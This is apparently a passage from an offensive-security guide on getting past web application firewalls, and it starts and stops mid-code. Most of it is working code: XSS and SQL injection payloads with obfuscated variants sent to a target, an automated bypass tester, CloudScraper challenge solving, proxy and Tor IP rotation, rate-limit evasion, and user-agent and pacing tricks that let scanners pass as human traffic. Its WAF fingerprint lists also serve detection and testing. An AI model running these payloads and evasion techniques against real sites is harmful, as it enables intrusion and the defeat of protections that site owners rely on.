        'bypass_length': len(bypass.text),
        'bypass_headers': dict(bypass.headers),
        'similarity_to_clean': _text_similarity(clean.text, bypass.text),
        'similarity_to_blocked': _text_similarity(blocked.text, bypass.text),
    }
    
    # Detection logic
    if results['bypass_status'] == 200 and results['blocked_status'] != 200:
        results['verdict'] = 'BYPASSED'
    elif results['bypass_length'] == results['blocked_length']:
        results['verdict'] = 'BLOCKED'
    elif results['similarity_to_clean'] > 0.9:
        results['verdict'] = 'BYPASSED'
    else:
        results['verdict'] = 'UNCERTAIN'
    
    return results

def _text_similarity(text1, text2):
    """Simple text similarity ratio."""
    if not text1 or not text2:
        return 0.0
    matcher = difflib.SequenceMatcher(None, text1[:1000], text2[:1000])
    return matcher.ratio()

# Usage
payload = {
    'blocked': "<script>alert(1)</script>",
    'bypass': "<ScRiPt>alert(1)</ScRiPt>",
}
result = validate_bypass('https://target.com/search', payload)
print(f"Verdict: {result['verdict']}")
```

### Timing Analysis

```python
import time
import requests
import statistics

def timing_bypass_test(url, blocked_payload, bypass_payload, iterations=5):
    """Use timing differences to confirm bypass."""
    s = requests.Session()
    
    def measure(payload):
        times = []
        for _ in range(iterations):
            start = time.time()
            resp = s.get(url, params={'q': payload})
            elapsed = time.time() - start
            times.append({
                'time': elapsed,
                'status': resp.status_code,
                'length': len(resp.text),
            })
            time.sleep(0.5)
        return times
    
    print("Testing blocked payload...")
    blocked_times = measure(blocked_payload)
    
    print("Testing bypass payload...")
    bypass_times = measure(bypass_payload)
    
    blocked_avg = statistics.mean([t['time'] for t in blocked_times])
    bypass_avg = statistics.mean([t['time'] for t in bypass_times])
    
    print(f"Blocked avg: {blocked_avg:.3f}s")
    print(f"Bypass avg:  {bypass_avg:.3f}s")
    
    # WAF block is usually faster (immediate rejection)
    # Origin processing is usually slower (actual application handling)
    if bypass_avg > blocked_avg * 1.5:
        print("[BYPASSED] Bypass requests take significantly longer — likely reached origin")
    elif bypass_avg < blocked_avg * 0.8:
        print("[UNCERTAIN] Bypass requests are faster — may still be WAF-handled")
    else:
        print("[UNCERTAIN] Timing difference is inconclusive")
```

### Content Comparison

```python
def content_compare(url, payload, session):
    """Compare response content for bypass indicators."""
    
    # Common WAF block messages across vendors
    waf_signatures = [
        'cloudflare', 'cf-error', 'attention required',
        'incapsula', 'blocked by incapsula',
        'blocked by sucuri', 'sucuri',
        'request blocked by', 'access denied',
        'the requested url was rejected',
        'potentially unsafe operation',
        '406 not acceptable',
        'verification required',
        'please complete the security check',
        'checking your browser',
        'just a moment',
        'bot verification',
        'reference number',
        'support id',
    ]
    
    # Application-specific success indicators (customize per target)
    success_indicators = [
        '{"data"', '{"result"', '{"success"',
        '<html', 'users', 'profile',
        '"id"', '"name"', '"email"',
    ]
    
    resp = session.get(url, params={'q': payload})
    text_lower = resp.text.lower()
    
    detections = []
    for sig in waf_signatures:
        if sig in text_lower:
            detections.append(f"WAF: {sig}")
    
    for ind in success_indicators:
        if ind.lower() in text_lower:
            detections.append(f"APP: {ind}")
    
    return {
        'status': resp.status_code,
        'length': len(resp.text),
        'detections': detections,
        'waf_blocked': any(sig in text_lower for sig in waf_signatures),
        'app_content': any(ind.lower() in text_lower for ind in success_indicators),
    }
```

### Error Message Verification

Different WAFs produce different error messages. A change in error message format often indicates a successful bypass:

```shell
# Cloudflare block (1020)
# "This website is using a security service to protect itself from online attacks"

# Origin error (application-level)
# "Invalid input format" or "Database query error" or actual response with data

# Test: gradually increase payload complexity
echo "Testing payload escalation..."
for payload in \
  "1" \
  "1'" \
  "1''" \
  "1' OR" \
  "1' OR '1'='1" \
  "1' UNION SELECT 1--" \
; do
  status=$(curl -s -o /tmp/resp.txt -w "%{http_code}" "https://target.com/?q=$payload")
  size=$(wc -c < /tmp/resp.txt)
  echo "$status $size $payload"
done
```

**Error message significance:**

| Error Message | What It Means |
|---------------|---------------|
| "Access denied" | WAF blocked |
| "404 Not Found" | Endpoint doesn't exist (after WAF bypass) |
| "500 Internal Server Error" | Reached origin, triggered app error |
| "Database error" | Reached origin, SQL error |
| "Invalid parameter" | Reached origin, validation error |
| "200 OK" + JSON/HTML | Successful origin hit |
| Empty response | May indicate bypass with no content |

---

## Tooling

### wafw00f

```shell
# Install
pip install wafw00f

# Basic usage
wafw00f https://target.com

# Verbose output
wafw00f https://target.com -v

# Multiple targets from file
wafw00f -i targets.txt -o results.txt

# Specific WAF testing
wafw00f https://target.com -a  # Test all WAFs
wafw00f https://target.com -t cloudflare  # Test only Cloudflare
wafw00f https://target.com -t akamai cloudflare f5  # Multiple

# Output formats
wafw00f https://target.com -o json
wafw00f https://target.com -o csv

# Scan subdomains
for sub in $(cat subdomains.txt); do
  wafw00f "https://$sub.target.com" -o json | python3 -c "
import sys, json
data = json.load(sys.stdin)
print(f'{data[\"url\"]}: {data[\"detected\"]} → {data.get(\"firewall\", \"None\")}')
"
done
```

**wafw00f detection strength:**

| WAF | Detection Reliability | Notes |
|-----|---------------------|-------|
| Cloudflare | ~95% | Multiple detection vectors |
| AWS WAF | ~70% | Inconsistent without CloudFront |
| Akamai | ~85% | Good with headers |
| F5 ASM | ~80% | Requires specific triggers |
| Imperva | ~85% | Cookie + header detection |
| ModSecurity | ~75% | Requires triggering |
| Sucuri | ~70% | Need specific payloads |
| Wordfence | ~60% | WordPress-only detection |
| Fastly | ~50% | Detection as CDN, not always WAF |

### CloudScraper

```python
# Basic CloudScraper with session reuse
import cloudscraper

scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'chrome',
        'platform': 'windows',
        'mobile': False,
    },
)

# Solve JS challenge once, reuse across requests
resp = scraper.get('https://target.com/')
print(f"Status: {resp.status_code}")
print(f"Cookies: {dict(scraper.cookies)}")

# Subsequent requests use the solved session
for path in ['/api/endpoint1', '/api/endpoint2']:
    resp = scraper.get(f'https://target.com{path}')
    print(f"{path}: {resp.status_code}")

# Save session for reuse
import pickle
with open('cloudflare_session.pkl', 'wb') as f:
    pickle.dump(scraper.cookies, f)

# Load saved session
with open('cloudflare_session.pkl', 'rb') as f:
    saved_cookies = pickle.load(f)
scraper.cookies.update(saved_cookies)
```

**CloudScraper configuration options:**

```python
scraper = cloudscraper.create_scraper(
    delay=15,                  # Delay between retries
    interpreter='native',      # 'native' or 'js2py'
    capture_error=True,         # Capture debug info
    allow_brotli=True,          # Support brotli compression
    doubleDown=False,           # Follow redirects automatically
    debug=True,                 # Enable debug output
    
    # Browser fingerprint
    browser={
        'browser': 'chrome',
        'platform': 'windows',
        'desktop': True,
        'mobile': False,
        'version': 125,
    },
    
    # Custom requests session
    session=requests.Session(),
    
    # Request configuration
    requestPostHook=lambda r: r,  # Post-request processing
)

# With proxy
proxies = {
    'http': 'http://user:pass@proxy:8080',
    'https': 'http://user:pass@proxy:8080',
}
scraper = cloudscraper.create_scraper(
    browser={'browser': 'chrome', 'platform': 'windows'},
    requestPostHook=lambda r: r,
)
scraper.proxies.update(proxies)
```

### cf-bypass Tools

```shell
# cf-bypass — automated origin discovery
pip install cf-bypass
cf-bypass target.com

# cloudflare-origin-ip
pip install cloudflare-origin-ip
cloudflare_origin_ip target.com

# bypass-cf
git clone https://github.com/gkbrk/bypass-cf.git
cd bypass-cf
python bypass.py target.com

# cloudfail
pip install cloudfail
cloudfail -t target.com -v

# Check for Cloudflare
pip install cloudflare-check
cloudflare-check target.com
```

### Burp Extensions

**WAF Bypasser (BApp Store):**

- Automatically tests various bypass techniques
- Supports Cloudflare, Akamai, F5, Imperva, ModSecurity
- Integrates with Intruder for automated bypass fuzzing
- Payload encoder/decoder for WAF-evasion encoding

**Other useful Burp extensions for WAF bypass:**

| Extension | Purpose |
|-----------|---------|
| WAF Bypasser | Automated bypass technique testing |
| AuthMatrix | Bypass via header manipulation |
| Turbo Intruder | High-speed fuzzing for bypass discovery |
| HTTP Request Smuggler | Protocol-level WAF bypass |
| Content-Type Converter | Content-type manipulation |
| Hackvertor | Custom encoding for payloads |
| Param Miner | Parameter discovery for bypass |
| Header Analysis | Header inspection and manipulation |

### Custom Bypass Scripts

```python
#!/usr/bin/env python3
import requests
import itertools
import sys

class WAFBypasser:
    """Systematic WAF bypass technique tester."""
    
    def __init__(self, target_url, param='q', payload="<script>alert(1)</script>"):
        self.url = target_url
        self.param = param
        self.payload = payload
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 ...',
            'Accept': '*/*',
        })
        
        # Baseline
        self.baseline = self.session.get(self.url)
        
    def test_all(self):
        """Run all bypass techniques and report results."""
        results = []
        
        for name, params in self._get_techniques():
            resp = self.session.get(self.url, params=params)
            status = resp.status_code
            length = len(resp.text)
            
            is_bypass = (
                status == self.baseline.status_code and
                abs(length - len(self.baseline.text)) < 500 and
                'blocked' not in resp.text.lower()
            )
            
            results.append({
                'technique': name,
                'status': status,
                'length': length,
                'bypass': is_bypass,
            })
        
        return results
    
    def _get_techniques(self):
        p = self.param
        pl = self.payload
        techniques = {
            # Case variation
            'uppercase': {p: pl.upper()},
            'mixed_case': {p: '<ScRiPt>alert(1)</ScRiPt>'},
            
            # URL encoding
            'url_encoded': {p: requests.utils.quote(pl)},
            'double_encoded': {p: requests.utils.quote(requests.utils.quote(pl))},
            
            # Comment injection
            'html_comment': {p: '<scr<!-->ipt>alert(1)</scr<!-->ipt>'},
            
            # Null byte
            'null_byte': {p: f'\x00{pl}'},
            
            # Header bypass
            'x_forwarded': {p: pl},
            # Note: headers set separately
            
            # Method conversion
            # Note: method changed separately
        }
        
        return techniques.items()

# Usage
bypasser = WAFBypasser('https://target.com/search')
results = bypasser.test_all()

for r in results:
    icon = '✅' if r['bypass'] else '❌'
    print(f"{icon} {r['technique']}: {r['status']} ({r['length']} bytes)")
```

### Fingerprint Databases

Maintain a local database of WAF fingerprints:

```python
# WAF fingerprint registry (extend as needed)
WAF_FINGERPRINTS = {
    'Cloudflare': {
        'headers': ['cf-ray', 'server: cloudflare', 'cf-cache-status'],
        'cookies': ['cf_clearance', '__cf_bm', '__cfduid'],
        'block_codes': [403, 503, 1020],
        'html_fragments': [
            'cf-browser-verification',
            'cf-error-details',
            'attention required',
            'checking your browser',
        ],
        'server': 'cloudflare',
    },
    'AWS_WAF': {
        'headers': ['x-amz-cf-id', 'x-amz-cf-pop', 'x-cache'],
        'cookies': [],
        'block_codes': [403],
        'html_fragments': ['request blocked', 'awswaf'],
        'server': 'CloudFront',
    },
    'Akamai': {
        'headers': ['x-akamai-transformed', 'x-akamai-request-id', 'akamai-grn'],
        'cookies': ['ak_bmsc', '_abck', 'bm_sz', 'bm_mi'],
        'block_codes': [403, 406],
        'html_fragments': ['akamai', 'reference number'],
        'server': 'AkamaiGHost',
    },
    'Imperva_Incapsula': {
        'headers': ['x-cdn: incapsula', 'x-iinfo'],
        'cookies': ['incap_ses', 'visid_incap', 'nlbi'],
        'block_codes': [403, 406],
        'html_fragments': ['incapsula', 'bot verification'],
        'server': None,
    },
    'F5_ASM': {
        'headers': ['x-asm-policy', 'x-asm-request-id', 'x-asm-version'],
        'cookies': [],
        'block_codes': [403, 400],
        'html_fragments': ['the requested url was rejected', 'support id'],
        'server': None,
    },
    'ModSecurity': {
        'headers': ['x-mod-security', 'x-content-type-options: nosniff'],
        'cookies': [],
        'block_codes': [406, 403, 500],
        'html_fragments': ['406 not acceptable', 'mod_security'],
        'server': None,
    },
    'Sucuri': {
        'headers': ['x-sucuri-id', 'x-sucuri-cache'],
        'cookies': ['sucuri_cloudproxy'],
        'block_codes': [403, 400],
        'html_fragments': ['blocked by sucuri', 'sucuri'],
        'server': None,
    },
    'Wordfence': {
        'headers': [],
        'cookies': ['wfwaf-authcookie'],
        'block_codes': [403, 503],
        'html_fragments': ['potentially unsafe operation', 'wordfence'],
        'server': None,
    },
    'Fastly': {
        'headers': ['x-served-by', 'x-cache', 'x-timer', 'fastly-debug'],
        'cookies': [],
        'block_codes': [403],
        'html_fragments': [],
        'server': None,
    },
    'StackPath': {
        'headers': ['x-proxy: stackpath', 'server: stackpath'],
        'cookies': [],
        'block_codes': [403],
        'html_fragments': [],
        'server': 'stackpath',
    },
}

def auto_detect_waf(url):
    """Automatically detect WAF based on fingerprints."""
    import requests
    
    resp = requests.get(url, timeout=10)
    headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
    body_lower = resp.text.lower()
    
    detected = []
    
    for waf_name, fp in WAF_FINGERPRINTS.items():
        score = 0
        
        # Check headers
        for header_sig in fp['headers']:
            key, _, value = header_sig.partition(': ')
            if value:
                if key in headers_lower and value in headers_lower[key]:
                    score += 2
            elif key in headers_lower:
                score += 2
        
        # Check cookies
        for cookie in fp['cookies']:
            if cookie in resp.headers.get('Set-Cookie', '').lower():
                score += 2
            if f'{cookie}=' in str(resp.cookies).lower():
                score += 2
        
        # Check HTML fragments
        for fragment in fp['html_fragments']:
            if fragment in body_lower:
                score += 1
        
        # Check status code
        if str(resp.status_code) in [str(c) for c in fp['block_codes']]:
            score += 0.5
        
        # Check server header
        if fp['server'] and headers_lower.get('server', '') == fp['server']:
            score += 3
        
        if score >= 3:
            detected.append({'waf': waf_name, 'score': score})
    
    return sorted(detected, key=lambda x: x['score'], reverse=True)
```

---

## Rate Limiting & IP Rotation

### Proxy Rotation Strategies

```python
import requests
import random
import time
from itertools import cycle

class ProxyRotator:
    """Rotate proxies to avoid WAF rate limiting."""
    
    def __init__(self, proxy_list=None):
        self.proxies = proxy_list or self._default_proxies()
        self.proxy_cycle = cycle(self.proxies)
        self.failed_proxies = set()
        self.request_count = 0
        
    def _default_proxies(self):
        """Load proxies from common sources."""
        return []
    
    def get_proxy(self):
        """Get next working proxy."""
        for _ in range(len(self.proxies)):
            proxy = next(self.proxy_cycle)
            if proxy not in self.failed_proxies:
                return proxy
        return None
    
    def request(self, url, method='GET', **kwargs):
        """Send request through rotating proxy."""
        self.request_count += 1
        
        # Rotate every N requests
        if 'proxy' not in kwargs or self.request_count % 10 == 0:
            proxy = self.get_proxy()
            if proxy:
                kwargs['proxies'] = {'http': proxy, 'https': proxy}
        
        try:
            resp = requests.request(
                method, url,
                timeout=30,
                **kwargs
            )
            
            # Check for rate limiting
            if resp.status_code == 429:
                retry_after = int(resp.headers.get('Retry-After', 60))
                print(f"[RATE LIMITED] Waiting {retry_after}s")
                time.sleep(retry_after)
                return self.request(url, method, **kwargs)
            
            return resp
            
        except requests.exceptions.ProxyError:
            # Remove failed proxy
            if 'proxies' in kwargs:
                for p in kwargs['proxies'].values():
                    self.failed_proxies.add(p)
            return self.request(url, method, **kwargs)
    
    def add_proxies_from_file(self, filepath):
        """Load proxies from file (ip:port format)."""
        with open(filepath) as f:
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    ip, port = line.split(':')
                    proxy = f'http://{ip}:{port}'
                    self.proxies.append(proxy)
                    self.proxy_cycle = cycle(self.proxies)
```

### Tor Integration

```shell
# Start Tor service
tor --ControlPort 9051 --CookieAuthentication 0

# Make requests through Tor
curl --socks5-hostname 127.0.0.1:9050 https://target.com/

# Python requests through Tor
python3 -c "
import requests

session = requests.Session()
session.proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050',
}
resp = session.get('https://target.com/')
print(resp.status_code)
"

# Renew Tor circuit (new IP)
echo -e 'AUTHENTICATE\r\nSIGNAL NEWNYM\r\nQUIT' | nc 127.0.0.1 9051

# Python Tor control
python3 -c "
from stem import Signal
from stem.control import Controller

with Controller.from_port(port=9051) as controller:
    controller.authenticate()
    controller.signal(Signal.NEWNYM)
    print('Tor circuit renewed')
"
```

### Datacenter vs Residential Proxies

| Proxy Type | Cost | Speed | Detection Risk | Best For |
|-----------|------|-------|----------------|----------|
| Datacenter | Low ($1-3/IP) | Fast | High (easily detected) | Initial recon, non-rate-limited targets |
| Residential | High ($8-15/IP) | Slower | Low (appears as real user) | Rate-limited targets, Cloudflare bypass |
| Mobile | Very High ($20+/IP) | Slow | Very Low | High-security targets |
| ISP (Static Residential) | Moderate ($3-8/IP) | Fast | Medium | Long sessions, no IP change needed |
| Tor | Free | Slow | Medium (Tor exit nodes blocked) | Anonymity, low-priority targets |

**Proxy provider comparison:**

```
BrightData (formerly Luminati):
  - 72M residential IPs
  - $8.40/GB (pay-per-bandwidth)
  - Country/city/ISP targeting

Oxylabs:
  - 100M+ residential IPs
  - $15/GB (real-time)
  - City-level targeting

Smartproxy:
  - 55M residential IPs
  - $50/5GB (fixed plans)
  - Good for scraping

Webshare:
  - Datacenter from $2/100 proxies
  - Residential from $6/GB
  - Good budget option

Stormproxies:
  - $50/month rotating
  - 70M+ IP pool
  - Unlimited bandwidth
```

### Rate Limit Detection

```python
class RateLimitDetector:
    """Detect and handle various rate limiting patterns."""
    
    def __init__(self, base_url):
        self.base_url = base_url
        self.responses = []
        
    def detect_rate_limit(self, response):
        """Check if response indicates rate limiting."""
        indicators = []
        
        # Status codes
        if response.status_code == 429:
            indicators.append('HTTP 429 Too Many Requests')
        if response.status_code == 503:
            indicators.append('HTTP 503 Service Unavailable')
        
        # Headers
        if 'Retry-After' in response.headers:
            indicators.append('Retry-After header present')
        if 'X-RateLimit-Remaining' in response.headers:
            remaining = response.headers['X-RateLimit-Remaining']
            if remaining == '0':
                indicators.append(f'Rate limit exhausted (remaining: {remaining})')
        
        # Cloudflare-specific
        if 'cf-error-code' in response.text:
            indicators.append('Cloudflare error code present')
        if '1015' in response.text:
            indicators.append('Cloudflare rate limit (1015) detected')
        
        # Body content
        rate_phrases = [
            'rate limit', 'too many requests', 'slow down',
            'try again later', 'exceeded', 'limit reached',
            'blocked', 'throttled', 'temporarily unavailable',
        ]
        for phrase in rate_phrases:
            if phrase.lower() in response.text.lower():
                indicators.append(f'Rate limit phrase in body: "{phrase}"')
        
        return indicators
    
    def analyze_pattern(self, url, requests_count=20, delay=0.5):
        """Send multiple requests and analyze response patterns."""
        import time
        
        for i in range(requests_count):
            resp = requests.get(url)
            indicators = self.detect_rate_limit(resp)
            
            self.responses.append({
                'index': i,
                'status': resp.status_code,
                'headers': dict(resp.headers),
                'indicators': indicators,
            })
            
            if indicators:
                print(f"[{i}] Rate limit indicators: {indicators}")
            
            time.sleep(delay)
        
        return self._summarize_pattern()
    
    def _summarize_pattern(self):
        """Summarize the rate limit pattern."""
        statuses = [r['status'] for r in self.responses]
        all_indicators = []
        for r in self.responses:
            all_indicators.extend(r['indicators'])
        
        return {
            'total_requests': len(self.responses),
            'statuses': {
                '200': statuses.count(200),
                '429': statuses.count(429),
                '503': statuses.count(503),
                '403': statuses.count(403),
                'other': [s for s in statuses if s not in [200, 429, 503, 403]],
            },
            'first_limit': next(
                (r['index'] for r in self.responses if r['indicators']),
                None
            ),
            'unique_indicators': list(set(all_indicators)),
        }
```

### Backoff Strategies

```python
import random
import time

class AdaptiveBackoff:
    """Adaptive backoff strategy for rate-limited requests."""
    
    def __init__(self, initial_delay=1.0, max_delay=300.0, jitter=True):
        self.initial_delay = initial_delay
        self.max_delay = max_delay
        self.jitter = jitter
        self.attempts = 0
        self.current_delay = initial_delay
        
    def wait(self):
        """Calculate and execute wait based on backoff strategy."""
        self.attempts += 1
        
        # Exponential backoff
        delay = min(
            self.initial_delay * (2 ** (self.attempts - 1)),
            self.max_delay
        )
        
        # Add jitter (±25%)
        if self.jitter:
            jitter_range = delay * 0.25
            delay += random.uniform(-jitter_range, jitter_range)
            delay = max(0, delay)  # Ensure non-negative
        
        self.current_delay = delay
        
        if delay > 0:
            print(f"[BACKOFF] Waiting {delay:.1f}s (attempt {self.attempts})")
            time.sleep(delay)
    
    def success(self):
        """Reset backoff on success."""
        self.attempts = 0
        self.current_delay = self.initial_delay
    
    def reset(self):
        """Reset backoff state."""
        self.attempts = 0
        self.current_delay = self.initial_delay

# Usage with WAF-aware wrapper
def safe_request(url, max_retries=10, **kwargs):
    """Wrapper with rate limit handling."""
    backoff = AdaptiveBackoff(
        initial_delay=2.0,
        max_delay=120.0,
        jitter=True
    )
    
    session = kwargs.pop('session', requests.Session())
    
    for attempt in range(max_retries):
        resp = session.get(url, **kwargs)
        
        # Success
        if resp.status_code == 200:
            backoff.success()
            return resp
        
        # Rate limited
        if resp.status_code == 429:
            retry_after = int(resp.headers.get(
                'Retry-After',
                backoff.current_delay
            ))
            time.sleep(retry_after)
            backoff.wait()
            continue
        
        # WAF block
        if resp.status_code in (403, 503) and 'cloudflare' in resp.text.lower():
            print(f"[WAF BLOCKED] Attempt {attempt + 1}")
            backoff.wait()
            continue
        
        # Other error
        if resp.status_code >= 500:
            backoff.wait()
            continue
        
        return resp
    
    return None
```

### IP Warmup

Technique: gradually increasing request rate from a new IP to avoid triggering rate limits:

```python
import time
import requests

def ip_warmup(url, start_delay=5.0, min_delay=0.5, steps=20):
    """Gradually increase request rate from a new IP."""
    delays = []
    
    # Generate decreasing delays (logarithmic scale)
    for i in range(steps):
        progress = i / steps
        delay = start_delay * (1 - progress) + min_delay * progress
        delays.append(delay)
    
    print(f"Warming up IP with {steps} requests over ~{sum(delays):.0f}s")
    
    results = []
    for i, delay in enumerate(delays):
        start = time.time()
        resp = requests.get(url)
        elapsed = time.time() - start
        
        results.append({
            'request': i + 1,
            'status': resp.status_code,
            'delay_before': delay,
            'response_time': elapsed,
        })
        
        if resp.status_code != 200:
            print(f"[WARN] Request {i + 1} returned {resp.status_code}")
        
        # If rate limited, increase delay
        if resp.status_code == 429:
            retry_after = int(resp.headers.get('Retry-After', 30))
            print(f"[RATE LIMITED] Warming up too fast — waiting {retry_after}s")
            time.sleep(retry_after)
        
        time.sleep(delay)
    
    # Analysis
    blocked = sum(1 for r in results if r['status'] != 200)
    print(f"\nWarmup complete: {len(results) - blocked}/{len(results)} successful")
    
    return results
```

---

## Crawler/Directory Scanner Bypass

### User-Agent Rotation

```python
import random

USER_AGENTS = [
    # Chrome (Windows)
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36',
    
    # Chrome (macOS)
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36',
    
    # Firefox (Windows)
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
    
    # Firefox (macOS)
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:126.0) Gecko/20100101 Firefox/126.0',
    
    # Safari (macOS)
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
    
    # Edge (Windows)
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0',
]

def get_random_ua():
    return random.choice(USER_AGENTS)

def rotate_ua(session):
    session.headers.update({'User-Agent': get_random_ua()})

# For ffuf:
# -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ..."
# For dirsearch:
# --user-agent-list --random-agent
```

### Request Pacing

Control the rate of automated requests to appear human:

```python
import time
import random
import requests

class RequestPacer:
    """Human-like request pacing."""
    
    def __init__(self, min_delay=1.0, max_delay=3.0):
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.last_request = 0
        self.burst_count = 0
        
    def wait(self):
        """Wait appropriate time before next request."""
        now = time.time()
        elapsed = now - self.last_request
        
        # Dynamic delay based on burst count
        if self.burst_count > 10:
            # Longer delay after bursts
            delay = random.uniform(self.min_delay * 2, self.max_delay * 2)
            self.burst_count = 0
        elif self.burst_count > 5:
            # Moderate delay
            delay = random.uniform(self.min_delay * 1.5, self.max_delay * 1.5)
        else:
            delay = random.uniform(self.min_delay, self.max_delay)
        
        # Add random noise (±20%)
        delay *= random.uniform(0.8, 1.2)
        
        if elapsed < delay:
            sleep_time = delay - elapsed
            time.sleep(sleep_time)
        
        self.last_request = time.time()
        self.burst_count += 1
    
    def reset(self):
        """Reset burst counter (call after natural pause)."""
        self.burst_count = 0
```

### Random Delays Between Directories

For directory/endpoint fuzzing with `ffuf` or `dirsearch`:

```shell
# ffuf with random delay
ffuf -u https://target.com/FUZZ -w wordlist.txt \
  -p 0.5-2.0  # Random delay between 0.5-2.0 seconds

# ffuf with minimal delay (faster, more detectable)
ffuf -u https://target.com/FUZZ -w wordlist.txt \
  -p 0.1

# dirsearch with random delay
dirsearch -u https://target.com/ -w wordlist.txt \
  --random-agent --delay 2

# gobuster with delay
gobuster dir -u https://target.com/ -w wordlist.txt \
  -t 1 --delay 2s
```

### Cookie Persistence

Maintain cookies across requests to appear as a consistent user:

```python
import pickle
import requests
import os

class CookiePersister:
    """Save and restore cookies across sessions."""
    
    def __init__(self, cookie_file='session_cookies.pkl'):
        self.cookie_file = cookie_file
        self.session = requests.Session()
        self._load_cookies()
    
    def _load_cookies(self):
        if os.path.exists(self.cookie_file):
            with open(self.cookie_file, 'rb') as f:
                try:
                    cookies = pickle.load(f)
                    self.session.cookies.update(cookies)
                    print(f"Loaded {len(cookies)} cookies from {self.cookie_file}")
                except:
                    pass
    
    def _save_cookies(self):
        with open(self.cookie_file, 'wb') as f:
            pickle.dump(dict(self.session.cookies), f)
    
    def request(self, *args, **kwargs):
        resp = self.session.request(*args, **kwargs)
        self._save_cookies()
        return resp

# Usage
persister = CookiePersister()
resp = persister.request('GET', 'https://target.com/')

# Reuse the same session with solved challenges
resp2 = persister.request('GET', 'https://target.com/protected')
```

### Session Handling

```python
class SessionManager:
    """Manage multiple sessions with different fingerprints."""
    
    def __init__(self):
        self.sessions = {}
        
    def create_session(self, name, user_agent=None):
        """Create a new session with unique fingerprint."""
        session = requests.Session()
        
        session.headers.update({
            'User-Agent': user_agent or random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
        })
        
        # Add a unique session identifier
        session.cookies.set('session_id', f'session_{name}_{random.randint(10000, 99999)}')
        
        self.sessions[name] = {
            'session': session,
            'created': time.time(),
            'requests': 0,
        }
        
        return session
    
    def rotate_session(self, name):
        """Rotate to a different user-agent and session."""
        new_name = f"{name}_{int(time.time())}"
        new_session = self.create_session(
            new_name,
            user_agent=random.choice(USER_AGENTS)
        )
        
        # Transfer any important cookies
        if name in self.sessions:
            for cookie in ['cf_clearance', '__cf_bm']:
                if cookie in self.sessions[name]['session'].cookies:
                    new_session.cookies.set(
                        cookie,
                        self.sessions[name]['session'].cookies[cookie]
                    )
        
        return new_session
    
    def get_session(self, name):
        """Get or create a named session."""
        if name not in self.sessions:
            return self.create_session(name)
        return self.sessions[name]['session']
    
    def request(self, name, method, url, **kwargs):
        """Make request using named session."""
        session = self.get_session(name)
        self.sessions[name]['requests'] += 1
        
        # Rotate session every N requests
        if self.sessions[name]['requests'] > 50:
            session = self.rotate_session(name)
        
        return session.request(method, url, **kwargs)
```

### 404 vs Soft-404 Detection

When scanning directories behind a WAF, distinguish actual 404 from soft-404:

```python
import requests

class Soft404Detector:
    """Detect soft-404 responses (pages that return 200 but show "not found")."""
    
    def __init__(self, base_url):
        self.base_url = base_url
        self.baseline_404 = None
        self.baseline_200 = None
        self.soft_404_signatures = [
            'page not found',
            'not found',
            '404',
            'does not exist',
            'could not be found',
            'no results',
            'nothing here',
            'content unavailable',
            'error occurred',
            'page no longer exists',
            'has been removed',
            'looking for something?',
        ]
        
    def setup_baselines(self):
        """Establish baseline 404 and 200 responses."""
        # Baseline 404 from guaranteed non-existent path
        nonexistent = f'{self.base_url}/_nonexistent_path_{random.randint(10000, 99999)}_'
        resp_404 = requests.get(nonexistent)
        self.baseline_404 = {
            'status': resp_404.status_code,
            'length': len(resp_404.text),
            'headers': dict(resp_404.headers),
            'title': self._extract_title(resp_404.text),
        }
        
        # Baseline 200 from homepage
        resp_200 = requests.get(self.base_url)
        self.baseline_200 = {
            'status': resp_200.status_code,
            'length': len(resp_200.text),
            'headers': dict(resp_200.headers),
            'title': self._extract_title(resp_200.text),
        }
        
        print(f"Baseline 404: {self.baseline_404['status']} - {self.baseline_404['length']}b")
        print(f"Baseline 200: {self.baseline_200['status']} - {self.baseline_200['length']}b")
    
    def is_soft_404(self, response):
        """Determine if a response is a soft 404."""
        # Exact status code 404
        if response.status_code == 404:
            return True
        
        # Length matches baseline 404
        if abs(len(response.text) - self.baseline_404['length']) < 100:
            return True
        
        # Title matches baseline 404
        title = self._extract_title(response.text)
        if title and title == self.baseline_404.get('title'):
            return True
        
        # Content contains soft-404 signatures
        text_lower = response.text.lower()
        for sig in self.soft_404_signatures:
            if sig in text_lower:
                return True
        
        # Length is suspiciously close to 404 (within 20%)
        if self.baseline_404['length'] > 0:
            ratio = len(response.text) / self.baseline_404['length']
            if 0.8 < ratio < 1.2 and self.baseline_200['length'] > 0:
